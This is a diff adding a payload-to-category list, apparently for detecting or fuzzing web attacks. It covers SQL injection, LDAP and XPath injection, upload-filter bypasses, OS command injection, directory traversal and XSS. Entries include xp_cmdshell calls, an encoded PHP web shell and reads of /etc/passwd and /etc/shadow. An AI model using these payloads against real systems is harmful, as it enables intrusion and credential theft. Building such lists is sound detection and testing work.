@@ -1,0 +1,660 @@
+@variable : SQL injection attack
+,@variable : SQL injection attack
+PRINT : SQL injection attack
+PRINT @@variable : SQL injection attack
+from : SQL injection attack
+insert : SQL injection attack
+procedure : SQL injection attack
+limit : SQL injection attack
+order by : SQL injection attack
+asc : SQL injection attack
+desc : SQL injection attack
+delete : SQL injection attack
+update : SQL injection attack
+distinct : SQL injection attack
+having : SQL injection attack
+truncate : SQL injection attack
+handler : SQL injection attack
+bfilename : SQL injection attack
+union : SQL injection attack
+'%20-- : SQL injection attack
+--'; : SQL injection attack
+'%20; : SQL injection attack
+=%20' : SQL injection attack
+=%20; : SQL injection attack
+=%20-- : SQL injection attack
+'or%20select * : SQL injection attack
+admin'-- : SQL injection attack
+<>"'%;)(&+ : SQL injection attack
+'%20or%20''=' : SQL injection attack
+'%20or%20'x'='x : SQL injection attack
+"%20or%20"x"="x : SQL injection attack
+')%20or%20('x'='x : SQL injection attack
+0 or 1=1 : SQL injection attack
+' or 0=0 -- : SQL injection attack
+" or 0=0 -- : SQL injection attack
+or 0=0 -- : SQL injection attack
+' or 0=0 # : SQL injection attack
+" or 0=0 # : SQL injection attack
+or 0=0 # : SQL injection attack
+' or 1=1-- : SQL injection attack
+" or 1=1-- : SQL injection attack
+' or '1'='1'-- : SQL injection attack
+"' or 1 --'" : SQL injection attack
+or 1=1-- : SQL injection attack
+or%201=1 : SQL injection attack
+or%201=1 -- : SQL injection attack
+' or 1=1 or ''=' : SQL injection attack
+" or 1=1 or ""=" : SQL injection attack
+' or a=a-- : SQL injection attack
+" or "a"="a : SQL injection attack
+') or ('a'='a : SQL injection attack
+") or ("a"="a : SQL injection attack
+hi" or "a"="a : SQL injection attack
+hi" or 1=1 -- : SQL injection attack
+hi' or 1=1 -- : SQL injection attack
+hi' or 'a'='a : SQL injection attack
+hi') or ('a'='a : SQL injection attack
+hi") or ("a"="a : SQL injection attack
+'hi' or 'x'='x'; : SQL injection attack
+' or username like '% : SQL injection attack
+' or uname like '% : SQL injection attack
+' or userid like '% : SQL injection attack
+' or uid like '% : SQL injection attack
+' or user like '% : SQL injection attack
+exec xp : SQL injection attack
+exec sp : SQL injection attack
+'; exec master..xp_cmdshell : SQL injection attack
+'; exec xp_regread : SQL injection attack
+t'exec master..xp_cmdshell 'nslookup www.google.com'-- : SQL injection attack
+--sp_password : SQL injection attack
+' UNION SELECT : SQL injection attack
+' UNION ALL SELECT : SQL injection attack
+' or (EXISTS) : SQL injection attack
+' (select top 1 : SQL injection attack
+'||UTL_HTTP.REQUEST : SQL injection attack
+1;SELECT%20\* : SQL injection attack
+to_timestamp_tz : SQL injection attack
+tz_offset : SQL injection attack
+&lt;&gt;&quot;'%;)(&amp;+ : SQL injection attack
+'%20or%201=1 : SQL injection attack
+%27%20or%201=1 : SQL injection attack
+%20$(sleep%2050) : SQL injection attack
+%20'sleep%2050' : SQL injection attack
+char%4039%41%2b%40SELECT : SQL injection attack
+&apos;%20OR : SQL injection attack
+'sqlattempt1 : SQL injection attack
+(sqlattempt2) : SQL injection attack
+*(|(mail=*)) : SQL injection attack
+%2A%28%7C%28mail%3D%2A%29%29 : SQL injection attack
+*(|(objectclass=*)) : SQL injection attack
+%2A%28%7C%28objectclass%3D%2A%29%29 : SQL injection attack
+' or 1=1 or ''=' : SQL injection attack
+' or ''=' : SQL injection attack
+x' or 1=1 or 'x'='y : SQL injection attack
+ union select  : SQL injection attack
++union+select+ : SQL injection attack
+/**/union/**/select/**/ : SQL injection attack
+/**/UNunionION/**/SELselectECT/**/ : SQL injection attack
+/**//*UnIOn*//**//*SEleCt*//**/ : SQL injection attack
+/**//*U*//*n*//*I*//*O*//*n*//**//*S*//*E*//*l*//*e*//*C*//*t*//**/ : SQL injection attack
+ union all select  : SQL injection attack
++union+all+select+ : SQL injection attack
+/**/union/**/all/**/select/**/ : SQL injection attack
+/**/UNunionION/**/all/**/SELselectECT/**/ : SQL injection attack
+/**//*UnIOn*//**/all/**//*SEleCt*//**/ : SQL injection attack
+/**//*U*//*n*//*I*//*O*//*n*//**//*all*//**//*S*//*E*//*l*//*e*//*C*//*t*//**/ : SQL injection attack
+ waitfor delay '0:0:10'-- : SQL injection attack
++waitfor+delay+'0:0:10'-- : SQL injection attack
+/**/waitfor/**/delay/**/'0:0:10'-- : SQL injection attack
+%20waitfor%20delay%20'0:0:20'-- : SQL injection attack
+ waitfor delay '0:0:10'/* : SQL injection attack
++waitfor+delay+'0:0:10'/* : SQL injection attack
+/**/waitfor/**/delay/**/'0:0:10'/* : SQL injection attack
+%20waitfor%20delay%20'0:0:20'/* : SQL injection attack
+'  waitfor delay '0:0:10'--+ : SQL injection attack
+'+waitfor+delay+'0:0:10'--+ : SQL injection attack
+'/**/ waitfor/**/delay/**/'0:0:10'--+ : SQL injection attack
+'%20waitfor%20delay%20'0:0:20'--+ : SQL injection attack
+ and 0=benchmark(3000000,MD5(1))-- : SQL injection attack
++and+0=benchmark(3000000,MD5(1))+-- : SQL injection attack
+/**/and/**/0=benchmark(3000000,MD5(1))/**/-- : SQL injection attack
+%20and%200=benchmark(3000000,MD5(1))%20-- : SQL injection attack
+ and 0=benchmark(3000000,MD5(1))/* : SQL injection attack
++and+0=benchmark(3000000,MD5(1))+/* : SQL injection attack
+/**/and/**/0=benchmark(3000000,MD5(1))/**//* : SQL injection attack
+%20and%200=benchmark(3000000,MD5(1))%20/* : SQL injection attack
+' and 0=benchmark(3000000,MD5(1))--+ : SQL injection attack
+'+and+0=benchmark(3000000,MD5(1))+--+ : SQL injection attack
+'/**/and/**/0=benchmark(3000000,MD5(1))/**/--+ : SQL injection attack
+'%20and%200=benchmark(3000000,MD5(1))%20--+ : SQL injection attack
+sleep(__TIME__)# : SQL injection attack
+1 or sleep(__TIME__)# : SQL injection attack
+" or sleep(__TIME__)# : SQL injection attack
+' or sleep(__TIME__)# : SQL injection attack
+" or sleep(__TIME__)=" : SQL injection attack
+' or sleep(__TIME__)=' : SQL injection attack
+1) or sleep(__TIME__)# : SQL injection attack
+") or sleep(__TIME__)=" : SQL injection attack
+') or sleep(__TIME__)=' : SQL injection attack
+1)) or sleep(__TIME__)# : SQL injection attack
+")) or sleep(__TIME__)=" : SQL injection attack
+')) or sleep(__TIME__)=' : SQL injection attack
+pg_sleep(__TIME__)-- : SQL injection attack
+1 or pg_sleep(__TIME__)-- : SQL injection attack
+" or pg_sleep(__TIME__)-- : SQL injection attack
+' or pg_sleep(__TIME__)-- : SQL injection attack
+1) or pg_sleep(__TIME__)-- : SQL injection attack
+") or pg_sleep(__TIME__)-- : SQL injection attack
+') or pg_sleep(__TIME__)-- : SQL injection attack
+1)) or pg_sleep(__TIME__)-- : SQL injection attack
+")) or pg_sleep(__TIME__)-- : SQL injection attack
+')) or pg_sleep(__TIME__)-- : SQL injection attack
+<?system('id');?> : SQL injection attack
+<?system('uname -a');?> : SQL injection attack
+<?php phpinfo(); ?> : SQL injection attack
+<? system($_GET['c']); ?> : SQL injection attack
+0x3c3f2073797374656d28245f4745545b2763275d293b203f3e : SQL injection attack
+PD8gc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg== : SQL injection attack
+%3C%3F%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E : SQL injection attack
+char(60,63,32,115,121,115,116,101,109,40,36,95,71,69,84,91,39,99,39,93,41,59,32,63,62) : SQL injection attack
+data:;base64,PD8gZXhlYygkX0dFVFtjbWRdKTsgPz4=&cmd=whoami : SQL injection attack
+data:;base64,PD8gZXhlYygkX0dFVFtjbWRdKTsgPz4=&cmd=whoami : SQL injection attack
+data:;base64,<? exec($_GET[cmd]); ?>&cmd=whoami : SQL injection attack
+ and 1=1-- : SQL injection attack
+ and 1=2-- : SQL injection attack
+ and 5050=5050-- : SQL injection attack
+ and 5050=5051-- : SQL injection attack
+ and substring(@@version,1,1)=4-- : SQL injection attack
+ and substring(@@version,1,1)=5-- : SQL injection attack
+ and ORD(MID((VERSION()), N, 1)) Insert<>=Comparer<InsertCharValueHere>-- : SQL injection attack
+ and (SELECT 1 from admin limit 0,1)=1-- : SQL injection attack
+ and (SELECT 1 from tblAdmin limit 0,1)=1-- : SQL injection attack
+ and (SELECT 1 from Administrator limit 0,1)=1-- : SQL injection attack
+ and (SELECT 1 from tbl_admin limit 0,1)=1-- : SQL injection attack
+ and (SELECT 1 from user limit 0,1)=1-- : SQL injection attack
+ and (SELECT 1 from users limit 0,1)=1-- : SQL injection attack
+ and (SELECT 1 from TableName limit 0,1)=1-- : SQL injection attack
+ and (SELECT substring(concat(1,ID),1,1) from admin limit 0,1)=1-- : SQL injection attack
+ and (SELECT substring(concat(1,name),1,1) from tblAdmin limit 0,1)=1-- : SQL injection attack
+ and (SELECT substring(concat(1,login),1,1) from Administrator limit 0,1)=1-- : SQL injection attack
+ and (SELECT substring(concat(1,password),1,1) from user limit 0,1)=1-- : SQL injection attack
+ and (SELECT substring(concat(1,email),1,1) from users limit 0,1)=1-- : SQL injection attack
+ and (SELECT substring(concat(1,<insert-column-guess-here>),1,1) from <table-name> limit 0,1)=1-- : SQL injection attack
+ and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),1,1))>65-- : SQL injection attack
+ and 1=1 : SQL injection attack
+ and 1=2 : SQL injection attack
+ and 1>2 : SQL injection attack
+ and 1<=2 : SQL injection attack
++and+1=1 : SQL injection attack
++and+1=2 : SQL injection attack
++and+1>2 : SQL injection attack
++and+1<=2 : SQL injection attack
+/**/and/**/1=1 : SQL injection attack
+/**/and/**/1=2 : SQL injection attack
+/**/and/**/1>2 : SQL injection attack
+/**/and/**/1<=2 : SQL injection attack
+/**/or/**/1/**/=/**/1 : SQL injection attack
+/**/or/**/1/**/=/**/2 : SQL injection attack
+/**/or/**/1/**/>/**/2 : SQL injection attack
+/**/or/**/1/**/<=/**/2 : SQL injection attack
+ and 50=50 : SQL injection attack
+ and 50=52 : SQL injection attack
+ and 50>52 : SQL injection attack
+ and 50<=52 : SQL injection attack
++and+50=50 : SQL injection attack
++and+50=52 : SQL injection attack
++and+50>52 : SQL injection attack
++and+50<=52 : SQL injection attack
+/**/and/**/50=50 : SQL injection attack
+/**/and/**/50=52 : SQL injection attack
+/**/and/**/50>52 : SQL injection attack
+/**/and/**/50<=52 : SQL injection attack
+/**/or/**/51/**/=/**/51 : SQL injection attack
+/**/or/**/51/**/=/**/52 : SQL injection attack
+/**/or/**/51/**/>/**/52 : SQL injection attack
+/**/or/**/51/**/<=/**/52 : SQL injection attack
+ waitfor delay '0:0:10'-- : SQL injection attack
+; waitfor delay '0:0:10'-- : SQL injection attack
++waitfor+delay+'0:0:10'-- : SQL injection attack
+/**/waitfor/**/delay/**/'0:0:10'- : SQL injection attack-
+%20waitfor%20delay%20'0:0:20'-- : SQL injection attack
+ waitfor delay '0:0:10'-- : SQL injection attack
+; waitfor delay '0:0:10'-- : SQL injection attack
++waitfor+delay+'0:0:10'/* : SQL injection attack
+/**/waitfor/**/delay/**/'0:0:10'/\ : SQL injection attack*
+%20waitfor%20delay%20'0:0:20'/* : SQL injection attack
+'  waitfor delay '0:0:10'--+ : SQL injection attack
+'+waitfor+delay+'0:0:10'--+ : SQL injection attack
+'/**/ waitfor/**/delay/**/'0:0:10'--+ : SQL injection attack
+'%20waitfor%20delay%20'0:0:20'--+ : SQL injection attack
+ and 0=benchmark(3000000,MD5(1))-- : SQL injection attack
++and+0=benchmark(3000000,MD5(1))+-- : SQL injection attack
+/**/and/**/0=benchmark(3000000,MD5(1))/**/-- : SQL injection attack
+%20and%200=benchmark(3000000,MD5(1))%20-- : SQL injection attack
+; and 0=benchmark(3000000,MD5(1))/* : SQL injection attack
+ and 0=benchmark(3000000,MD5(1))/* : SQL injection attack
++and+0=benchmark(3000000,MD5(1))+/* : SQL injection attack
+/**/and/**/0=benchmark(3000000,MD5(1))/**//* : SQL injection attack
+%20and%200=benchmark(3000000,MD5(1))%20/* : SQL injection attack
+' and 0=benchmark(3000000,MD5(1))--+ : SQL injection attack
+'+and+0=benchmark(3000000,MD5(1))+--+ : SQL injection attack
+'/**/and/**/0=benchmark(3000000,MD5(1))/**/--+ : SQL injection attack
+'%20and%200=benchmark(3000000,MD5(1))%20--+ : SQL injection attack
+sleep(__TIME__)# : SQL injection attack
+1 or sleep(__TIME__)# : SQL injection attack
+" or sleep(__TIME__)# : SQL injection attack
+' or sleep(__TIME__)# : SQL injection attack
+" or sleep(__TIME__)=" : SQL injection attack
+' or sleep(__TIME__)=' : SQL injection attack
+1) or sleep(__TIME__)# : SQL injection attack
+") or sleep(__TIME__)=" : SQL injection attack
+') or sleep(__TIME__)=' : SQL injection attack
+1)) or sleep(__TIME__)# : SQL injection attack
+")) or sleep(__TIME__)=" : SQL injection attack
+')) or sleep(__TIME__)=' : SQL injection attack
+pg_sleep(__TIME__)-- : SQL injection attack
+1 or pg_sleep(__TIME__)-- : SQL injection attack
+" or pg_sleep(__TIME__)-- : SQL injection attack
+' or pg_sleep(__TIME__)-- : SQL injection attack
+1) or pg_sleep(__TIME__)-- : SQL injection attack
+") or pg_sleep(__TIME__)-- : SQL injection attack
+') or pg_sleep(__TIME__)-- : SQL injection attack
+1)) or pg_sleep(__TIME__)-- : SQL injection attack
+")) or pg_sleep(__TIME__)-- : SQL injection attack
+')) or pg_sleep(__TIME__)-- : SQL injection attack
+%2A%28%7C%28mail%3D%2A%29%29 : LDAP注入攻击
+%2A%28%7C%28objectclass%3D%2A%29%29 : LDAP注入攻击
+%2A%7C : LDAP注入攻击
+*(|(mail=*)) : LDAP注入攻击
+*(|(objectclass=*)) : LDAP注入攻击
+x' or name()='username' or 'x'='y : LDAP注入攻击
+*()|&' : LDAP注入攻击
+admin\* : LDAP注入攻击
+admin*)((|userpassword=*) : LDAP注入攻击
+*)(uid=*))(|(uid=* : LDAP注入攻击
+*()|%26' : LDAP注入攻击
+phtml : Malicious file upload attack
+php3 : Malicious file upload attack
+php4 : Malicious file upload attack
+php5 : Malicious file upload attack
+pHtml : Malicious file upload attack
+pHp3 : Malicious file upload attack
+pHp4 : Malicious file upload attack
+pHp5 : Malicious file upload attack
+asa : Malicious file upload attack
+iNc%00 : Malicious file upload attack
+iNc%20%20%20 : Malicious file upload attack
+iNc%20%20%20...%20.%20.. : Malicious file upload attack
+iNc...... : Malicious file upload attack
+inc%00 : Malicious file upload attack
+inc%20%20%20 : Malicious file upload attack
+inc%20%20%20...%20.%20.. : Malicious file upload attack
+inc...... : Malicious file upload attack
+pHp%00 : Malicious file upload attack
+pHp%20%20%20 : Malicious file upload attack
+pHp%20%20%20...%20.%20.. : Malicious file upload attack
+pHp...... : Malicious file upload attack
+pHp3%00 : Malicious file upload attack
+pHp3%20%20%20 : Malicious file upload attack
+pHp3%20%20%20...%20.%20.. : Malicious file upload attack
+pHp3...... : Malicious file upload attack
+pHp4%00 : Malicious file upload attack
+pHp4%20%20%20 : Malicious file upload attack
+pHp4%20%20%20...%20.%20.. : Malicious file upload attack
+pHp4...... : Malicious file upload attack
+pHp5%00 : Malicious file upload attack
+pHp5%20%20%20 : Malicious file upload attack
+pHp5%20%20%20...%20.%20.. : Malicious file upload attack
+pHp5...... : Malicious file upload attack
+pHtml%00 : Malicious file upload attack
+pHtml%20%20%20 : Malicious file upload attack
+pHtml%20%20%20...%20.%20.. : Malicious file upload attack
+pHtml...... : Malicious file upload attack
+php%00 : Malicious file upload attack
+php%20%20%20 : Malicious file upload attack
+php%20%20%20...%20.%20.. : Malicious file upload attack
+php...... : Malicious file upload attack
+php3%00 : Malicious file upload attack
+php3%20%20%20 : Malicious file upload attack
+php3%20%20%20...%20.%20.. : Malicious file upload attack
+php3...... : Malicious file upload attack
+php4%00 : Malicious file upload attack
+php4%20%20%20 : Malicious file upload attack
+php4%20%20%20...%20.%20.. : Malicious file upload attack
+php4...... : Malicious file upload attack
+php5%00 : Malicious file upload attack
+php5%20%20%20 : Malicious file upload attack
+php5%20%20%20...%20.%20.. : Malicious file upload attack
+php5...... : Malicious file upload attack
+phtml%00 : Malicious file upload attack
+phtml%20%20%20 : Malicious file upload attack
+phtml%20%20%20...%20.%20.. : Malicious file upload attack
+phtml...... : Malicious file upload attack
+asp%20%20%20 : Malicious file upload attack
+aspx%20%20%20 : Malicious file upload attack
+asa%20%20%20 : Malicious file upload attack
+aSP%20%20%20 : Malicious file upload attack
+aSpx%20%20%20 : Malicious file upload attack
+aSa%20%20%20 : Malicious file upload attack
+asp...... : Malicious file upload attack
+aspx...... : Malicious file upload attack
+asa...... : Malicious file upload attack
+aSP...... : Malicious file upload attack
+aSpx...... : Malicious file upload attack
+aSa...... : Malicious file upload attack
+asp%20%20%20...%20.%20.. : Malicious file upload attack
+aspx%20%20%20...%20.%20.. : Malicious file upload attack
+asa%20%20%20...%20.%20.. : Malicious file upload attack
+aSP%20%20%20...%20.%20.. : Malicious file upload attack
+aSpx%20%20%20...%20.%20.. : Malicious file upload attack
+aSa%20%20%20...%20.%20.. : Malicious file upload attack
+asp%00 : Malicious file upload attack
+aspx%00 : Malicious file upload attack
+asa%00 : Malicious file upload attack
+aSp%00 : Malicious file upload attack
+aSpx%00 : Malicious file upload attack
+aSa%00 : Malicious file upload attack
+cfm : Malicious file upload attack
+cfml : Malicious file upload attack
+cfc : Malicious file upload attack
+dbm : Malicious file upload attack
+cFm : Malicious file upload attack
+cFml : Malicious file upload attack
+cFc : Malicious file upload attack
+dBm : Malicious file upload attack
+cfm%20%20%20 : Malicious file upload attack
+cfml%20%20%20 : Malicious file upload attack
+cfc%20%20%20 : Malicious file upload attack
+dbm%20%20%20 : Malicious file upload attack
+cFm%20%20%20 : Malicious file upload attack
+cFml%20%20%20 : Malicious file upload attack
+cFc%20%20%20 : Malicious file upload attack
+dBm%20%20%20 : Malicious file upload attack
+cfm...... : Malicious file upload attack
+cfml...... : Malicious file upload attack
+cfc....... : Malicious file upload attack
+dbm...... : Malicious file upload attack
+cFm...... : Malicious file upload attack
+cFml...... : Malicious file upload attack
+cFc...... : Malicious file upload attack
+dBm...... : Malicious file upload attack
+cfm%20%20%20...%20.%20.. : Malicious file upload attack
+cfml%20%20%20...%20.%20.. : Malicious file upload attack
+cfc%20%20%20...%20.%20.. : Malicious file upload attack
+dbm%20%20%20...%20.%20.. : Malicious file upload attack
+cFm%20%20%20...%20.%20.. : Malicious file upload attack
+cFml%20%20%20...%20.%20.. : Malicious file upload attack
+cFc%20%20%20...%20.%20.. : Malicious file upload attack
+dBm%20%20%20...%20.%20.. : Malicious file upload attack
+cfm%00 : Malicious file upload attack
+cfml%00 : Malicious file upload attack
+cfc%00 : Malicious file upload attack
+dbm%00 : Malicious file upload attack
+cFm%00 : Malicious file upload attack
+cFml%00 : Malicious file upload attack
+cFc%00 : Malicious file upload attack
+dBm%00 : Malicious file upload attack
+jspx : Malicious file upload attack
+jsw : Malicious file upload attack
+jsv : Malicious file upload attack
+jspf : Malicious file upload attack
+jSpx : Malicious file upload attack
+jSw : Malicious file upload attack
+jSv : Malicious file upload attack
+jSpf : Malicious file upload attack
+jSp%00 : Malicious file upload attack
+jSp%20%20%20 : Malicious file upload attack
+jSp%20%20%20...%20.%20..a : Malicious file upload attack
+jSp...... : Malicious file upload attack
+jSpf%00 : Malicious file upload attack
+jSpf%20%20%20 : Malicious file upload attack
+jSpf%20%20%20...%20.%20..a : Malicious file upload attack
+jSpf...... : Malicious file upload attack
+jSpx%00 : Malicious file upload attack
+jSpx%20%20%20 : Malicious file upload attack
+jSpx%20%20%20...%20.%20..a : Malicious file upload attack
+jSpx...... : Malicious file upload attack
+jSv%00 : Malicious file upload attack
+jSv%20%20%20 : Malicious file upload attack
+jSv%20%20%20...%20.%20..a : Malicious file upload attack
+jSv...... : Malicious file upload attack
+jSw%00 : Malicious file upload attack
+jSw%20%20%20 : Malicious file upload attack
+jSw%20%20%20...%20.%20..a : Malicious file upload attack
+jSw...... : Malicious file upload attack
+jsp%00 : Malicious file upload attack
+jsp%20%20%20 : Malicious file upload attack
+jsp%20%20%20...%20.%20..a : Malicious file upload attack
+jsp...... : Malicious file upload attack
+jspf%00 : Malicious file upload attack
+jspf%20%20%20 : Malicious file upload attack
+jspf%20%20%20...%20.%20..a : Malicious file upload attack
+jspf...... : Malicious file upload attack
+jspx%00 : Malicious file upload attack
+jspx%20%20%20 : Malicious file upload attack
+jspx%20%20%20...%20.%20..a : Malicious file upload attack
+jspx...... : Malicious file upload attack
+jsv%00 : Malicious file upload attack
+jsv%20%20%20 : Malicious file upload attack
+jsv%20%20%20...%20.%20..a : Malicious file upload attack
+jsv...... : Malicious file upload attack
+jsw%00 : Malicious file upload attack
+jsw%20%20%20 : Malicious file upload attack
+jsw%20%20%20...%20.%20..a : Malicious file upload attack
+jsw...... : Malicious file upload attack
+' or '1'='1 : Xpath注入攻击
+' or ''=' : Xpath注入攻击
+x' or 1=1 or 'x'='y : Xpath注入攻击
+count(/child::node()) : Xpath注入攻击
+x' or name()='username' or 'x'='y : Xpath注入攻击
+' and count(/*)=1 and '1'='1 : Xpath注入攻击
+' and count(/@*)=1 and '1'='1 : Xpath注入攻击
+' and count(/comment())=1 and '1'='1 : Xpath注入攻击
+uname -n -s : OS command injection attack
+whoami|pwd : OS command injection attack
+cat /etc/passwd : OS command injection attack
+ls -la /tmp : OS command injection attack
+ls -la /home : OS command injection attack
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt; : OS command injection attack
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt; : OS command injection attack
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt; : OS command injection attack
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt; : OS command injection attack
+/index.html|id| : OS command injection attack
+;id; : OS command injection attack
+;id : OS command injection attack
+;netstat -a; : OS command injection attack
+;id; : OS command injection attack
+|id : OS command injection attack
+|/usr/bin/id : OS command injection attack
+|id| : OS command injection attack
+|/usr/bin/id| : OS command injection attack
+||/usr/bin/id| : OS command injection attack
+|id; : OS command injection attack
+||/usr/bin/id; : OS command injection attack
+;id| : OS command injection attack
+;|/usr/bin/id| : OS command injection attack
+\n/bin/ls -al\n : OS command injection attack
+\n/usr/bin/id\n : OS command injection attack
+\nid\n : OS command injection attack
+\n/usr/bin/id; : OS command injection attack
+\nid; : OS command injection attack
+\n/usr/bin/id| : OS command injection attack
+\nid| : OS command injection attack
+;/usr/bin/id\n : OS command injection attack
+;id\n : OS command injection attack
+|usr/bin/id\n : OS command injection attack
+|nid\n : OS command injection attack
+`id` : OS command injection attack
+`/usr/bin/id` : OS command injection attack
+a);id : OS command injection attack
+a;id : OS command injection attack
+a);id; : OS command injection attack
+a;id; : OS command injection attack
+a);id| : OS command injection attack
+a;id| : OS command injection attack
+a)|id : OS command injection attack
+a|id : OS command injection attack
+a)|id; : OS command injection attack
+a|id : OS command injection attack
+|/bin/ls -al : OS command injection attack
+a);/usr/bin/id : OS command injection attack
+a;/usr/bin/id : OS command injection attack
+a);/usr/bin/id; : OS command injection attack
+a;/usr/bin/id; : OS command injection attack
+a);/usr/bin/id| : OS command injection attack
+a;/usr/bin/id| : OS command injection attack
+a)|/usr/bin/id : OS command injection attack
+a|/usr/bin/id : OS command injection attack
+a)|/usr/bin/id; : OS command injection attack
+a|/usr/bin/id : OS command injection attack
+;system('cat%20/etc/passwd') : OS command injection attack
+;system('id') : OS command injection attack
+;system('/usr/bin/id') : OS command injection attack
+%0Acat%20/etc/passwd : OS command injection attack
+%0A/usr/bin/id : OS command injection attack
+%0Aid : OS command injection attack
+%0A/usr/bin/id%0A : OS command injection attack
+%0Aid%0A : OS command injection attack
+& ping -i 30 127.0.0.1 : OS command injection attack &
+& ping -n 30 127.0.0.1 & : OS command injection attack
+%0a ping -i 30 127.0.0.1 %0a : OS command injection attack
+`ping 127.0.0.1` : OS command injection attack
+| id : OS command injection attack
+& id : OS command injection attack
+; id : OS command injection attack
+%0a id %0a : OS command injection attack
+`id` : OS command injection attack
+$;/usr/bin/id : OS command injection attack
+/etc/passwd : 目录遍历攻击
+/etc/shadow : 目录遍历攻击
+/apache/logs/error.log  : 目录遍历攻击
+/apache/logs/access.log  : 目录遍历攻击
+/apache/logs/error.log  : 目录遍历攻击
+/apache/logs/access.log  : 目录遍历攻击
+/apache/logs/error.log  : 目录遍历攻击
+/apache/logs/access.log  : 目录遍历攻击
+/etc/httpd/logs/acces_log  : 目录遍历攻击
+/etc/httpd/logs/acces.log  : 目录遍历攻击
+/etc/httpd/logs/error_log  : 目录遍历攻击
+/etc/httpd/logs/error.log  : 目录遍历攻击
+/var/www/logs/access_log  : 目录遍历攻击
+/var/www/logs/access.log  : 目录遍历攻击
+/usr/local/apache/logs/access_log  : 目录遍历攻击
+/usr/local/apache/logs/access.log  : 目录遍历攻击
+/var/log/apache/access_log  : 目录遍历攻击
+/var/log/apache2/access_log  : 目录遍历攻击
+/var/log/apache/access.log  : 目录遍历攻击
+/var/log/apache2/access.log  : 目录遍历攻击
+/var/log/access_log  : 目录遍历攻击
+/var/log/access.log  : 目录遍历攻击
+/var/www/logs/error_log  : 目录遍历攻击
+/var/www/logs/error.log  : 目录遍历攻击
+/usr/local/apache/logs/error_log  : 目录遍历攻击
+/usr/local/apache/logs/error.log  : 目录遍历攻击
+/var/log/apache/error_log  : 目录遍历攻击
+/var/log/apache2/error_log  : 目录遍历攻击
+/var/log/apache/error.log  : 目录遍历攻击
+/var/log/apache2/error.log  : 目录遍历攻击
+/var/log/error_log  : 目录遍历攻击
+/var/log/error.log  : 目录遍历攻击
+<script>alert('Zer0Lulz')</script> : XSS攻击
+<ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+"><script>alert('XSS')</script> : XSS攻击
+"><ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+=><><script>alert('XSS')</script> : XSS攻击
+=><><ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+="><script>alert('XSS')</script> : XSS攻击
+="><ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+='><script>alert('XSS')</script> : XSS攻击
+='><ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+="><<script>alert('XSS')</script> : XSS攻击
+="><<ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+='><<script>alert('XSS')</script> : XSS攻击
+='><<ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+<script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+"><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+"><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+=><><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+=><><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+="><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+="><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+='><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+='><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+="><<script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+="><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+='><<script>alert(String.fromCharCode(88, 83, 83)</script> : XSS攻击
+='><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS攻击
+"%3e%3cscript%3ealert('XSS')%3c%2fscript%3e : XSS攻击
+"%3e%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e : XSS攻击
+=%3e%3c%3e%3cscript>alert('XSS')%3c%2fscript%3e : XSS攻击
+=%3e%3c%3e%3cScRiPt>AlErT('XSS')%3c%2fScRiPt%3e : XSS攻击
+="%3e%3cscript%3ealert('XSS')%3c%2fscript%3e : XSS攻击
+="%3e%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e : XSS攻击
+='%3e%3cscript%3ealert('XSS')%3c%2fscript%3e : XSS攻击
+='%3e%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e : XSS攻击
+="%3e%3c%3cscript%3ealert('XSS')%3c%2fscript%3e : XSS攻击
+="%3e%3c%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e : XSS攻击
+='%3e%3c%3cscript%3ealert('XSS')%3c%2fscript%3e : XSS攻击
+='%3e%3c%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e : XSS攻击
+\\><script>alert('XSS')</script> : XSS攻击
+\\><ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+=><><script>alert('XSS')</script> : XSS攻击
+=><><ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+=\\><script>alert('XSS')</script> : XSS攻击
+=\\><ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+=\><script>alert('XSS')</script> : XSS攻击
+=\><ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+=\\><<script>alert('XSS')</script> : XSS攻击
+=\\><<ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+=\><<script>alert('XSS')</script> : XSS攻击
+=\><<ScRiPt>AlErT('XSS')</ScRiPt> : XSS攻击
+"%3e%3cscript%3ealert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
+"%3e%3cScRiPt%3eAlErT(String.fromCharCode(88, 83, 83)%3c%2fScRiPt%3e : XSS攻击
+=%3e%3c%3e%3cscript>alert(String.fromCharCode(88, 83, 83)%3c%2fscript%3e : XSS攻击
